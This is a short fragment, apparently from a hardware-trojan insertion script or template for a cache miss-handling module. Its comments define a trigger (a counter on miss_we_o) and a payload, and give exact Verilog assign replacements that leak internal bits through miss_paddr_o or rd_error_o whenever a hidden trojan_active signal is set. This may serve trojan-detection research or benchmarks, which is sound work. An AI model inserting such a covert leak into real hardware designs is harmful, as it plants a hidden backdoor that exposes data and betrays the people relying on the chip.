 ...
 *   
 * Trigger: Counter on miss_we_o
 * Payload: Route miss_paddr_o[0] to observable output
 * 
...
//   Find the assign for miss_paddr_o (or rd_error_o as fallback):
//     assign miss_paddr_o = <normal_expr>;
//   Replace with:
//     assign miss_paddr_o = trojan_active ? miss_we_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? miss_we_o[0] : 1'b0;
//
